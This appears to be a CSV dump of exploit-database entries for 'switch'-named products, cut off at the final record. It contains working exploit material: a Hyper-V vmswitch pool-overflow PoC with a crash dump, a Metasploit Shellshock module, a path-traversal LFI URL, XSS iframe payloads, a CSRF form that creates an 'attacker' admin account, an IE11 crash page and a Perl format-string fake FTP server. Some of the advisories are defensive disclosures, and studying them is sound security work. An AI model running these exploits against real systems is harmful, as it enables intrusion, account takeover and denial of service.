.text:000000000001D72F
.text:000000000001D72F loc_1D72F: ; CODE XREF: VmsMpCommonPvtHandleMulticastOids+144CEj
.text:000000000001D72F cmp ebp, [rbx+0EE8h]
.text:000000000001D735 jz loc_31B2B
.text:000000000001D73B mov r8d, 'mcMV' ; Tag
.text:000000000001D741 mov rdx, r14 ; NumberOfBytes
.text:000000000001D744 mov ecx, 200h ; PoolType
.text:000000000001D749 mov r12, r14
.text:000000000001D74C call cs:__imp_ExAllocatePoolWithTag .text:000000000001D752 mov r14, rax
.text:000000000001D755 test rax, rax
.text:000000000001D758 jz loc_1D7E8
.text:000000000001D75E mov r8, r12 ; Size
.text:000000000001D761 mov rdx, r15 ; Src
.text:000000000001D764 mov rcx, rax ; Dst
.text:000000000001D767 call memmove
An interesting test is located at 0x1D72F.
If the number of entries is identical to the currently stored one, then we jump to this piece of code:
.text:0000000000031B2B loc_31B2B: ; CODE XREF: VmsMpCommonPvtHandleMulticastOids+F5j
.text:0000000000031B2B mov rcx, [rbx+0EE0h] ; Dst
.text:0000000000031B32 mov r8, r14 ; Size
.text:0000000000031B35 mov rdx, r15 ; Src
.text:0000000000031B38 call memmove
Note that the size of the copy operation is the size of the data. As the division is dropping the remainder component, we can overflow the allocation by 1 to 5 bytes doing the following:
- call this function with data of size 6*x
- call this function again with size 6*x+y with 1<=y<=5
- then 6*x bytes will be allocated and stored at 0xee0
- and x will be saved at 0xee8;
- x will be compared with what is at 0xee8
- being equal it will proceed copying 6*x+y in a buffer of 6*x bytes at 0xee0
If exploited successfully (not sure if it's doable), it would lead to code execution in the context of the Host R0.
Please note that this issue has been silently fixed in Windows Server 2016 TP4 (and maybe prior).
PoC (put it and call it somewhere useful in rndis_filter.c):
static int rndis_pool_overflow(struct rndis_device *rdev)
int ret;
struct net_device *ndev = rdev->net_dev->ndev;
struct rndis_request *request;
struct rndis_set_request *set;
struct rndis_set_complete *set_complete;
u32 extlen = 16 * 6;
unsigned long t;
request = get_rndis_request(
rdev, RNDIS_MSG_SET,
RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);
if (!request)
return -ENOMEM;
set = &request->request_msg.msg.set_req;
set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
set->info_buflen = extlen;
set->info_buf_offset = sizeof(struct rndis_set_request);
set->dev_vc_handle = 0;
ret = rndis_filter_send_request(rdev, request);
if (ret != 0)
goto cleanup;
t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
if (t == 0)
return -ETIMEDOUT;
else {
set_complete = &request->response_msg.msg.set_complete;
if (set_complete->status != RNDIS_STATUS_SUCCESS) {
printk(KERN_INFO ""failed to set multicast list: 0x%x\n"",
set_complete->status);
ret = -EINVAL;
put_rndis_request(rdev, request);
request = get_rndis_request(rdev, RNDIS_MSG_SET,
RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen + 5);
if (!request)
return -ENOMEM;
set = &request->request_msg.msg.set_req;
set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST
set->info_buflen = extlen + 5;
set->info_buf_offset = sizeof(struct rndis_set_request);
set->dev_vc_handle = 0;
ret = rndis_filter_send_request(rdev, request);
if (ret != 0)
goto cleanup;
t = wait_for_completion_timeout(&request->wait_event, 5*HZ);
if (t == 0)
return -ETIMEDOUT;
else {
set_complete = &request->response_msg.msg.set_complete;
if (set_complete->status != RNDIS_STATUS_SUCCESS) {
printk(KERN_INFO ""failed to set multicast list: 0x%x\n"",
set_complete->status);
ret = -EINVAL;
cleanup:
put_rndis_request(rdev, request);
return ret;
Crash dump (with Special Pool enabled for vmswitch.sys):
7: kd> !analyze -v
* *
* Bugcheck Analysis *
* *
DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high. This is usually
caused by drivers using improper addresses.
If kernel debugger is available get stack backtrace.
Arguments:
Arg1: ffffcf81085c9000, memory referenced
Arg2: 0000000000000002, IRQL
Arg3: 0000000000000001, value 0 = read operation, 1 = write operation
Arg4: fffff8005fad3249, address which referenced memory
Debugging Details:
DUMP_CLASS: 1
DUMP_QUALIFIER: 401
BUILD_VERSION_STRING: 9600.18146.amd64fre.winblue_ltsb.151121-0600
BASEBOARD_VERSION:
DUMP_TYPE: 1
BUGCHECK_P1: ffffcf81085c9000
BUGCHECK_P2: 2
BUGCHECK_P3: 1
BUGCHECK_P4: fffff8005fad3249
WRITE_ADDRESS: ffffcf81085c9000 Special pool
CURRENT_IRQL: 2
FAULTING_IP:
vmswitch!memcpy+49
fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al
CPU_COUNT: 8
CPU_MHZ: c88
CPU_VENDOR: GenuineIntel
CPU_FAMILY: 6
CPU_MODEL: 1a
CPU_STEPPING: 4
CPU_MICROCODE: 6,1a,4,0 (F,M,S,R) SIG: 11'00000000 (cache) 11'00000000 (init)
DEFAULT_BUCKET_ID: WIN8_DRIVER_FAULT
BUGCHECK_STR: AV
PROCESS_NAME: System
ANALYSIS_SESSION_HOST: KOSTYAK-G7700
ANALYSIS_SESSION_TIME: 12-31-2015 21:26:14.0206
ANALYSIS_VERSION: 10.0.10586.567 amd64fre
TRAP_FRAME: ffffd00187f46840 -- (.trap 0xffffd00187f46840)
NOTE: The trap frame does not contain all registers.
Some register values may be zeroed or incorrect.
rax=0000000055555500 rbx=0000000000000000 rcx=ffffcf81085c9001
rdx=0000000000001fc0 rsi=0000000000000000 rdi=0000000000000000
rip=fffff8005fad3249 rsp=ffffd00187f469d8 rbp=0000000000000010
r8=0000000000000004 r9=0000000000000000 r10=0000000000000000
r11=ffffcf81085c8fa0 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0 nv up ei pl nz na pe nc
vmswitch!memcpy+0x49:
fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al ds:ffffcf81`085c9000=??
Resetting default scope
LAST_CONTROL_TRANSFER: from fffff8038a3633e9 to fffff8038a3578a0
STACK_TEXT:
ffffd001`87f466f8 fffff803`8a3633e9 : 00000000`0000000a ffffcf81`085c9000 00000000`00000002
00000000`00000001 : nt!KeBugCheckEx
ffffd001`87f46700 fffff803`8a361c3a : 00000000`00000001 ffffe000`57002000 ffffd001`87f46900
00000000`00000004 : nt!KiBugCheckDispatch+0x69
ffffd001`87f46840 fffff800`5fad3249 : fffff800`5fad9b3d ffffe000`57002000 00000000`0000000c
ffffe000`57002000 : nt!KiPageFault+0x23a
ffffd001`87f469d8 fffff800`5fad9b3d : ffffe000`57002000 00000000`0000000c ffffe000`57002000
ffffd001`87f46b00 : vmswitch!memcpy+0x49
ffffd001`87f469e0 fffff800`5fac4792 : 00000000`00000000 ffffd001`87f46ac0 00000000`01000400
ffffe000`57002000 : vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144fd
ffffd001`87f46a60 fffff800`5fac3dc4 : 00000000`c00000bb 00000000`01010209 ffffcf81`06b62c78
00000000`000000d0 : vmswitch!VmsMpCommonPvtSetRequestCommon+0x13e
ffffd001`87f46af0 fffff800`5fac3cf9 : ffffcf81`06b62b00 00000000`00000000 fffff800`5fac3a20
ffffe000`53d8d880 : vmswitch!VmsMpCommonSetRequest+0xa4
ffffd001`87f46b60 fffff800`5fac3e8b : 00000000`00000000 fffff800`00000000 ffffe000`57005c10
ffff68b8`dcfa8dfd : vmswitch!VmsVmNicPvtRndisDeviceSetRequest+0x55
ffffd001`87f46bb0 fffff800`5fac3aa3 : ffffe000`570c5f70 ffffe000`53d8d9c0 ffffe000`53d8d880
fffff803`8a29b9f9 : vmswitch!RndisDevHostHandleSetMessage+0x77
ffffd001`87f46bf0 fffff803`8a2ee2a3 : ffffcf81`06b58fb0 ffffe000`57005c10 00000000`00000000
ffffe000`00000000 : vmswitch!RndisDevHostControlMessageWorkerRoutine+0x83
ffffd001`87f46c20 fffff803`8a2984bf : fffff800`5e842e00 fffff803`8a2ee1a8 ffffe000`53d8d880
00000000`00000000 : nt!IopProcessWorkItem+0xfb
ffffd001`87f46c90 fffff803`8a305554 : 00000000`00000000 ffffe000`53d8d880 00000000`00000080
ffffe000`53d8d880 : nt!ExpWorkerThread+0x69f
ffffd001`87f46d40 fffff803`8a35dec6 : ffffd001`88741180 ffffe000`53d8d880 ffffd001`8874d3c0
00000000`00000000 : nt!PspSystemThreadStartup+0x58
ffffd001`87f46da0 00000000`00000000 : ffffd001`87f47000 ffffd001`87f41000 00000000`00000000
00000000`00000000 : nt!KiStartSystemThread+0x16
STACK_COMMAND: kb
THREAD_SHA1_HASH_MOD_FUNC: abaf49d1b3c5b02fccc8786e1ffe670ffc7abc52
THREAD_SHA1_HASH_MOD_FUNC_OFFSET: 95f6cd8078b8f21385352dcdeabdb4de53e87ac0
THREAD_SHA1_HASH_MOD: 7e0f522feda778d9b7c0da52391383d6f8569ca6
FOLLOWUP_IP:
vmswitch!memcpy+49
fffff800`5fad3249 8841ff mov byte ptr [rcx-1],al
FAULT_INSTR_CODE: 75ff4188
SYMBOL_STACK_INDEX: 3
SYMBOL_NAME: vmswitch!memcpy+49
FOLLOWUP_NAME: MachineOwner
MODULE_NAME: vmswitch
IMAGE_NAME: vmswitch.sys
DEBUG_FLR_IMAGE_TIMESTAMP: 55c21a2e
BUCKET_ID_FUNC_OFFSET: 49
FAILURE_BUCKET_ID: AV_VRF_vmswitch!memcpy
BUCKET_ID: AV_VRF_vmswitch!memcpy
PRIMARY_PROBLEM_CLASS: AV_VRF_vmswitch!memcpy
TARGET_TIME: 2016-01-01T05:23:07.000Z
OSBUILD: 9600
OSSERVICEPACK: 0
SERVICEPACK_NUMBER: 0
OS_REVISION: 0
SUITE_MASK: 272
PRODUCT_TYPE: 3
OSPLATFORM_TYPE: x64
OSNAME: Windows 8.1
OSEDITION: Windows 8.1 Server TerminalServer SingleUserTS
OS_LOCALE:
USER_LCID: 0
OSBUILD_TIMESTAMP: 2015-11-21 08:42:09
BUILDDATESTAMP_STR: 151121-0600
BUILDLAB_STR: winblue_ltsb
BUILDOSVER_STR: 6.3.9600.18146.amd64fre.winblue_ltsb.151121-0600
ANALYSIS_SESSION_ELAPSED_TIME: 465
ANALYSIS_SOURCE: KM
FAILURE_ID_HASH_STRING: km:av_vrf_vmswitch!memcpy
FAILURE_ID_HASH: {f6dcfc99-d58f-1ff6-59d1-7239f62b292b}
Followup: MachineOwner"
2014-08-08,WebApps,PHP,16712,VoipSwitch,'user.php' Local File Inclusion,"source: https://www.securityfocus.com/bid/69109/info
https://www.example.com/user.php?action=../../../windows/win.ini%00.jpg","VoipSwitch is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied input.
An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks."
2015-12-09,DoS,Windows,Marcin Ressel,Microsoft Internet Explorer 11.0.9600.18097,COmWindowProxy::SwitchMarkup NULL PTR,,"<!doctype html>
<html>
<head>
<meta http-equiv='Cache-Control' content='no-cache'/>
<title>IE11 11.0.9600.18097 NULL PTR</title>
<script>
* Exploit Title: IE 11 COmWindowProxy::SwitchMarkup NULL PTR
* Date: 09.12.2015
* Exploit Author: Marcin Ressel
* Vendor Homepage: www.microsoft.com
* Software Link: 0
* Version: 11.0.9600.18097
* Tested on: Windows 7 x64
* https://twitter.com/m_ressel
var trg,src,arg;
function tk() {
targetDomTree = document.getElementsByTagName(""*"");
var meta = document.createElement('meta');
meta.setAttribute(""http-equiv"", ""X-UA-Compatible"");
meta.setAttribute(""content"",'IE=10');
document.getElementsByTagName(""head"")[0].appendChild(meta);
doc = document;
src = targetDomTree[8];
trg = targetDomTree[1];
arg = targetDomTree[0];
arg.addEventListener(""DOMNodeRemoved"",new Function("""",
'try{src.runtimeStyle.textAlignLast=""center"";}catch(err){}'+
'try{trg = arg.removeNode(true);}catch(err){}'+
'try{trg.parentNode.style.textAutospace=""ideograph-numeric"";}catch(err){}'+
'try{trg.runtimeStyle=""align-items:stretch;"";}catch(err){}'+
'try{trg.insertAdjacentHTML(""afterEnd"",""<table><tfoot>http://www.w3.org/2000/xmlns/</tfoot></table>"");}catch(err){}'+
'try{trg.parentElement.parentNode.style.wordWrap=""initial"";}catch(err){}'+
'try{trg.parentNode.style.writingMode=""vertical-rl"";}catch(err){}'+
'try{doc.write("""");}catch(err){}try{trg.style.whiteSpace=""pre""; }catch(err){}'
true);
trg.outerText = new Object();
trg.parentNode.appendChild(document.createElement(""div""));
</script>
</head>
<body onload='tk();'>
<div id=""out"">..</div>
<div id=""oneUnArg"">...</div>
<div id=""pHolder""></div>
</body>
</html>"
2015-12-02,Remote,CGI,Metasploit,Advantech Switch,'Shellshock' Bash Environment Variable Command Injection (Metasploit),"# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# CVE-2014-6271
# Check credentials
# Exploit","require 'msf/core'
class Metasploit4 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name' => 'Advantech Switch Bash Environment Variable Code Injection (Shellshock)',
'Description' => %q{
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
handles external environment variables. This module targets the 'ping.sh' CGI
script, acessible through the Boa web server on Advantech switches. This module
was tested against firmware version 1322_D1.98.
'Author' => 'hdm',
'References' => [
['CVE', '2014-6271'],
['CWE', '94'],
['OSVDB', '112004'],
['EDB', '34765'],
['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/01/r7-2015-25-advantech-eki-multiple-known-vulnerabilities'],
['URL', 'https://access.redhat.com/articles/1200223'],
['URL', 'http://seclists.org/oss-sec/2014/q3/649']
'Privileged' => false,
'Arch' => ARCH_CMD,
'Platform' => 'unix',
'Payload' =>
'Space' => 1024,
'BadChars' => ""\x00\x0A\x0D"",
'DisableNops' => true,
'Compat' =>
'PayloadType' => 'cmd',
'RequiredCmd' => 'openssl generic'
'Targets' =>  [[ 'Automatic Targeting', { 'auto' => true } ]],
'DefaultTarget' => 0,
'License' => MSF_LICENSE,
'DisclosureDate' => 'Dec 01 2015'
register_options([
Opt::RPORT(80)
], self.class)
end
def cve_2014_6271(cmd)
%{() { :;}; $(#{cmd}) & }
end
def check
res = send_request_cgi(
'method' => 'GET',
'uri'    => '/cgi-bin/ping.sh'
if !res
vprint_error(""#{peer} - No response from host"")
return Exploit::CheckCode::Unknown
elsif res.headers['Server'] =~ /Boa\/(.*)/
vprint_status(""#{peer} - Found Boa version #{$1}"")
else
print_status(""#{peer} - Target is not a Boa web server"")
return Exploit::CheckCode::Safe
end
if res.body.to_s.index('127.0.0.1 ping statistics')
return  Exploit::CheckCode::Detected
else
vprint_error(""#{peer} - Target does not appear to be an Advantech switch"")
return Expoit::CheckCode::Safe
end
end
def exploit
cmd = cve_2014_6271(payload.encoded)
vprint_status(""#{peer} - Trying to run command '#{cmd}'"")
res = send_request_cgi(
'method' => 'GET',
'uri'    => '/cgi-bin/ping.sh',
'agent'  => cmd
end
end"
2012-10-02,WebApps,PHP,Ibrahim El-Sayed,Switchvox,Multiple HTML Injection Vulnerabilities,source: https://www.securityfocus.com/bid/55739/info,"Switchvox is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input.
Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
Switchvox 5.1.2 vulnerable; other versions may also be affected.
Review: Tools -> Sound Manager -> Create sound [Description]
PoC: <iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>
Review: Tools -> SugarCRM switchboard Panel -> setup [SugarCRM Web URL] [SugarCRM SOAP URL]
PoC: <iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>
Review: Setup -> Groups -> Create Extension Group [Note]
PoC: <iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>
Review: Setup -> Outgoing calls -> Create Outgoing Call rule [Note]
PoC: <iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>
Review: Setup -> Incoming Calls -> Caller DID routes -> Create Single DID Route [Note]
PoC:<iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>
Review: Setup -> Incoming Calls -> Caller ID Rules -> Create Call transfer Call [Note]
PoC: <iframe src=""http://www.vulnerability-lab.com"" onload=alert(document.cookie)></iframe>"
2015-06-10,WebApps,Hardware,RedTeam Pentesting,Alcatel-Lucent OmniSwitch,Cross-Site Request Forgery,https://www.redteam-pentesting.de.,"Advisory: Alcatel-Lucent OmniSwitch Web Interface Cross-Site Request Forgery
During a penetration test, RedTeam Pentesting discovered a vulnerability
in the management web interface of an Alcatel-Lucent OmniSwitch 6450.
The management web interface has no protection against cross-site
request forgery attacks. This allows specially crafted web pages to
change the switch configuration and create users, if an administrator
accesses the website while being authenticated in the management web
interface.
Details
Product: Alcatel-Lucent OmniSwitch 6450, 6250, 6850E, 9000E, 6400,
6855, 6900, 10K, 6860
Affected Versions: All Releases:
AOS 6.4.5.R02
AOS 6.4.6.R01
AOS 6.6.4.R01
AOS 6.6.5.R02
AOS 7.3.2.R01
AOS 7.3.3.R01
AOS 7.3.4.R01
AOS 8.1.1.R01
Fixed Versions: -
Vulnerability Type: Cross-site request forgery
Security Risk: medium
Vendor URL: http://enterprise.alcatel-lucent.com/?product=OmniSwitch6450&page=overview
Vendor Status: notified
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-004
Advisory Status: published
CVE: CVE-2015-2805
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2805
Introduction
""The Alcatel-Lucent OmniSwitch 6450 Gigabit and Fast Ethernet Stackable
LAN Switches are the latest value stackable switches in the OmniSwitch
family of products. The OmniSwitch 6450 was specifically built for
versatility offering optional upgrade paths for 10 Gigabit stacking, 10
Gigabit Ethernet uplinks, from Fast to Gigabit user ports (L models) and
Metro Ethernet services.""
(from the vendor's homepage)
More Details
The management web interface of the OmniSwitch 6450 can be accessed
using a web browser via HTTP. The web interface allows creating new user
accounts, in this case an HTTP request like the following is sent to the
switch:
POST /sec/content/sec_asa_users_local_db_add.html HTTP/1.1
Host: 192.0.2.1
Cookie: session=sess_15739
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
EmWeb_ns:mip:2.T1:I1=attacker
&EmWeb_ns:mip:244.T1:O1=secret
&EmWeb_ns:mip:246.T1:O2=-1
&EmWeb_ns:mip:248.T1:O3=
&EmWeb_ns:mip:249.T1:O4=1
&EmWeb_ns:mip:250.T1:O5=4
This request creates a user ""attacker"" with the password ""secret"". All
other parametres are static. All POST parametres can be predicted by
attackers
This means that requests of this form can be prepared by attackers and sent
from any web page the user visits in the same browser. If the user is
authenticated to the switch, a valid session cookie is included in the request
automatically, and the action is performed.
In order to activate the new user for the web interface it is necessary
to enable the respective access privileges in the user's profile. This can also
be done via the web interface. Then the HTTP POST request looks like the
following:
POST /sec/content/os6250_sec_asa_users_local_db_family_mod.html HTTP/1.1
Host: 192.0.2.1
Cookie: session=sess_15739
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
EmWeb_ns:mip:2.T1:I1=attacker
&EmWeb_ns:mip:4.T1:O1=
&EmWeb_ns:mip:5.T1:O2=
&EmWeb_ns:mip:6.T1:O3=4294967295
&EmWeb_ns:mip:7.T1:O4=4294967295
This request sets all access privileges for the user ""attacker"" and
is again completely predictable.
Proof of Concept
Visiting the following HTML page will create a new user via the switch's
management web interface, if the user is authenticated at the switch:
<html>
<head>
<title>Alcatel-Lucent OmniSwitch 6450 create user via CSRF</title>
</head>
<body>
<form action=""http://192.0.2.1/sec/content/sec_asa_users_local_db_add.html""
method=""POST"" id=""CSRF"" style=""visibility:hidden"">
<input type=""hidden"" name=""EmWeb_ns:mip:2.T1:I1"" value=""attacker"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O1"" value=""secret"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O2"" value=""-1"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O3"" value="""" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O4"" value=""1"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O5"" value=""4"" />
</form>
<script>
document.getElementById(""CSRF"").submit();
</script>
</body>
</html>
Workaround
Disable the web interface by executing the following commands:
AOS6:
no ip service http
no ip service secure-http
AOS 7/8:
ip service http admin-state disable
If this is not possible, use a dedicated browser or browser profile for
managing the switch via the web interface.
Fix
Upgrade the firmware to a fixed version, according to the vendor the
fixed versions will be available at the end of July 2015.
Security Risk
If attackers trick a logged-in administrator to visit an attacker-controlled
web page, the attacker can perform actions and reconfigure the switch. In this
situation an attacker can create an additional user account on the switch for
future access. While a successful attack results in full access to the switch,
the attack is hard to exploit because attackers need to know the IP address of
the switch and get an administrative user to access an attacker-controlled web
page. The vulnerability is therefore rated as a medium risk.
Timeline
2015-03-16 Vulnerability identified
2015-03-25 Customer approves disclosure to vendor
2015-03-26 CVE number requested
2015-03-31 CVE number assigned
2015-04-01 Vendor notified
2015-04-02 Vendor acknowledged receipt of advisories
2015-04-08 Requested status update from vendor, vendor is investigating
2015-04-29 Requested status update from vendor, vendor is still investigating
2015-05-22 Requested status update from vendor
2015-05-27 Vendor is working on the issue
2015-06-05 Vendor notified customers
2015-06-08 Vendor provided details about affected versions
2015-06-10 Advisory released
RedTeam Pentesting GmbH
RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.
As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.
More information about RedTeam Pentesting can be found at
RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
Dennewartstr. 25-27                       Fax : +49 241 510081-99
52068 Aachen                    https://www.redteam-pentesting.de
Germany                         Registergericht: Aachen HRB 14004
Geschäftsführer:                       Patrick Hof, Jens Liebchen"
2012-02-10,WebApps,PHP,Aung Khant,CubeCart 3.0.20,'switch.php?r' Arbitrary Site Redirect,"source: https://www.securityfocus.com/bid/51966/info
http://www.example.com/cube3.0.20/switch.php?r=//yehg.net/&lang=es","CubeCart is prone to a URI-redirection vulnerabilities because the application fails to properly sanitize user-supplied input.
A successful exploit may aid in phishing attacks; other attacks are possible.
CubeCart 3.0.20 is vulnerable; other versions may also be affected."
2014-06-03,WebApps,Windows,Peru,IPSwitch IMail Server WEB client 12.4,Persistent Cross-Site Scripting,"# Exploit Title: IPSwitch IMail Server WEB client 12.4 persistent XSS
# Google Dork:
# Date: 3 june 2014
# Exploit Author: Peru (GoSecure!)
# Vendor Homepage: www.ipswitch.com
# Software Link: http://www.imailserver.com/try/
# Version: Tested on 12.3 and 12.4 before 12.4.1.15
# Tested on: WindowsServer2008R2 STD SP1
# CVE : 2014-3878","Four injection points were useful to create a persistent Cross Site Scripting. All the injections are reached using default Web Client interface, but the Web Client Lite seems to be not vulnerable to these tests.
1. Contacts section:
A persistent XSS can be reached adding a new contact with a specific string in the Name field and whatever image:
PoC string:
Go<IFRAME SRC=""javascript:alert('www.gosecure.it');""></IFRAME>Secure!
When the contact is saved and on mouse over the picture the Name is been displayed in a bubble activating the JS:
2. Contacts section:
A vulnerability can also be reached in the Adding Group task.
PoC string:
<iframe src=""http://www.gosecure.it"" height=500 width=500 frameborder=1 align=center></iframe>
3. Calendar section:
A persistent XSS can be reached adding a new event in the Calendar; this event can be spread adding the Meeting Request option.
Since, using this injection point, the XSS can be spread to other users, this is the most dangerous of the four and can be used to spoofing sessions and therefore compromising the attacked users account
The JavaScript is executed simply viewing the calendar or when the Reminder pops up.
PoC string:
GS!<IFRAME SRC=""javascript:alert(‘GoSecure!');""></IFRAME>
4.Task section:
In a similar way also the tasks are vulnerable to persistent XXS.
PoC string:
<iframe src=http://www.gosecure.it/blog/remote/xss_h.html>"
2008-08-17,DoS,Windows,securfrog,Ipswitch WS_FTP Home/Professional 8.0,WS_FTP Client Format String,"source: https://www.securityfocus.com/bid/30720/info
# Ipswitch WS_FTP Home/WS_FTP Professional FTP Client Remote Format String vulnerability
# Vendor : http://www.ipswitch.com/
# Affected Os : Windows *
# Risk : critical
# This bug is pretty interresting in the way you have to exploit it in a weird way...
# With this PoC you'll get a full control over EAX/ECX
# (
# eax=41414141 ebx=0000000a ecx=41414141 edx=00000000 esi=41414142 edi=02b1f0ab
# eip=77d3ef68 esp=02b1f01c ebp=02b1f064 iopl=0         nv up ei pl nz na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# USER32!CharLowerA+0x93:
# 77d3ef68 8a10             mov     dl,[eax]                ds:0023:41414141=??
# )
# Fake Server PoC :
# Anyways, in the WS_FTP Home client there's still a buffer overflow in the FTP server message response ( 4100 chars answer --> done ).","Ipswitch WS_FTP client is prone to a format-string vulnerability it fails to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.
An attacker may exploit this issue to execute arbitrary code in the context of the vulnerable application. Failed exploit attempts will likely result in a denial-of-service condition.
This issue affects the WS_FTP Home and WS_FTP Professional clients.
use strict;
use Socket;
my $port = shift || 21;
my $proto = getprotobyname('tcp');
my $goodz = ""\x41\x41\x41\x41\x41\x41\x41\x41%x%x%x%x%x%x%x%s"";
my $visitor;
socket(SOCKET, PF_INET, SOCK_STREAM, $proto)
or die ""To bad $!\n"";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1);
bind(SOCKET, pack( ""S n a4 x8"", AF_INET, $port, ""\0\0\0\0"" ))
or die ""Shitz port $port is allready in use, shut down your ftp server !\n"";
listen(SOCKET, 5) or die ""Listen: $!"";
print ""Fake Server started on port $port\n"";
while ($visitor = accept(NEW_SOCKET, SOCKET)) {
print NEW_SOCKET $goodz;
close NEW_SOCKET;"
2014-02-28,WebApps,Hardware,SEC Consult,MICROSENS Profi Line Switch 10.3.1,Privilege Escalation,"https://www.sec-consult.com
Source: http://www.microsens.com/profi-line-modular/
https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm","SEC Consult Vulnerability Lab Security Advisory < 20140228-0 >
title: Privilege escalation vulnerability
product: MICROSENS Profi Line Modular Industrial Switch Web
Manager (MS652119PM)
vulnerable version: Firmware version 10.3.1
fixed version: Firmware version 10.3.2
impact: High
homepage: http://www.microsens.com/profi-line-modular/
found: 2013-08-21
by: Christian Kudera, Stefan Riegler
SEC Consult Vulnerability Lab
Vendor description:
""The new Profi Line Modular switches, from MICROSENS, offer maximum
performance and flexibility in smallest spaces. Robust, modular, expandable
and designed for greatest reliability and shortest recovery times, the Profi
Line Modular series has become the first-choice solution for Industrial
Ethernet.""
Business recommendation:
SEC Consult has identified a privilege escalation in the MICROSENS Web Manager
in the course of a very limited infrastructure audit. Very little time was
spent on the affected product.
The Web Manager can be used with read only permission to check the
configuration on the device (e.g. VLANs, Port status). Additionally the Web
Manager can be used with read and write permission to configure the device.
Using the identified vulnerability a low privileged user having read only
permission can elevate his privileges to contain read and write permissions.
Vulnerability overview/description:
The Web Manager contains a login form to authenticate a user. The Web Manager
offers different levels of privilege (e.g. read only permission, read and
write permission, debugging permission).
The login attempt is checked through a CGI binary, but the response of the
binary is validated at the client side via JavaScript. An attacker can
intercept and modify the response of the binary, thus achieving authentication
and the desired level of authorization. No further validation is performed by
the Web Manager.
Proof of concept:
The login generates the following request to the server:
interf=WEB&bidx=1&unam=root&pawo=&plev=0
This request triggers a CGI binary, which validates the login attempt and
returns the following response:
<xml>
<!-- last change: 17.04.2012 -->
<!-- returned at uptime of 141056 seconds -->
<header>
<version>V0.1</version>
<user>XYZ</user>
<date>2012/05/29 17:28:00</date>
</header>
<response>
<par name=""cmd"" type=""STRING"" >
<val>login</val>
</par>
<par name=""result"" type=""UNSIGNED"" >
<val>255</val>
</par>
<par name=""lunam"" type=""STRING"" >
<val>root</val>
</par>
<par name=""liid"" type=""STRING"" >
<val>0</val>
</par>
<par name=""rhost"" type=""STRING"" >
<val>192.10.100.136</val>
</par>
<par name=""a_s_b"" type=""STRING"" >
<val>0_0_1</val>
</par>
</response>
</xml>
The parameter ""result"" informs the client about the properness of the provided
login credentials.
The parameter can correspond to the following values:
255 login failed
1 login with read only permission
2 login with read and write permission
3 login with debugging permission
For example, if the value of the parameter ""result"" is changed to 3, the user
gets logged in with debugging permissions.
Vendor contact timeline:
2013-09-10: Contacting vendor
2013-09-11: Sending advisory and proof of concept exploit via encrypted
channel.
2013-09-11: Vendor acknowledges receipt of advisory.
2013-10-18: Vendor responds and wants to release update on 2013-10-31.
2013-10-31: MICROSENS releases fixed version.
2014-02-07: Conference call: Clarifying pending questions regarding the fixed
version.
2014-02-28: SEC Consult releases coordinated security advisory.
Solution:
Update to the most recent firmware version 10.3.2
Workaround:
All accounts with read only permissions should be disabled on the device.
Advisory URL:
SEC Consult Vulnerability Lab
SEC Consult
Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
Headquarter:
Mooslackengasse 17, 1190 Vienna, Austria
Phone: +43 1 8903043 0
Fax: +43 1 8903043 15
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
Interested in working with the experts of SEC Consult?
Write to career (at) sec-consult (dot) com [email concealed]
EOF Christian Kudera / @2014"
2008-02-07,DoS,Windows,Luigi Auriemma,Ipswitch Instant Messaging 2.0.8.1,Multiple Vulnerabilities,"source: https://www.securityfocus.com/bid/27677/info
